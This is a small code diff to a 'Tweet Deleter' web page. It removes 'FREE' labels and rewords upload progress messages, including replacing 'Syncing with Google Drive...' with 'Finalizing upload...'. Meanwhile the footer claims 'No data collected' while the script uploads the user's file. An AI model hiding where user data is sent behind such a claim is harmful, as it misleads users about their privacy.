@@ -648,7 +648,7 @@
           <path
             d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-4.714-6.231-5.401 6.231H2.744l7.73-8.835L1.254 2.25H8.08l4.253 5.622zm-1.161 17.52h1.833L7.084 4.126H5.117z" />
         </svg></div>
-      <span class="logo-name">Tweet Deleter<span class="free-tag">FREE</span></span>
+      <span class="logo-name">Tweet Deleter</span>
     </div>
     <div class="nav-links"><a href="#">Pricing</a><a href="#">FAQ</a></div>
   </nav>
@@ -872,7 +872,7 @@
           <path
             d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-4.714-6.231-5.401 6.231H2.744l7.73-8.835L1.254 2.25H8.08l4.253 5.622zm-1.161 17.52h1.833L7.084 4.126H5.117z" />
         </svg></div>
-      Tweet Deleter <span style="color:#16a34a;font-size:10px;margin-left:4px;font-weight:700;">FREE</span>
+      Tweet Deleter
     </div>
     <p>© 2025 Tweet Deleter · Free forever · No data collected</p>
   </footer>
@@ -953,7 +953,7 @@
         }
 
         // 3. إنهاء الرفع
-        progressText.textContent = 'Syncing with Google Drive...';
+        progressText.textContent = 'Finalizing upload...';
         const completeData = new FormData();
         completeData.append('upload_id', upload_id);
         completeData.append('filename', selectedFile.name);
@@ -967,7 +967,7 @@
         if (result.success) {
           progressFill.style.width = '100%';
           progressPct.textContent = '100%';
-          progressText.textContent = 'Done!';
+          progressText.textContent = 'Upload complete ✓';
           lockedFile.classList.add('unlocked');
           lockIcon.innerHTML = '<polyline points="20 6 9 17 4 12"/>';
           lockedHint.textContent = 'Upload complete ✓';
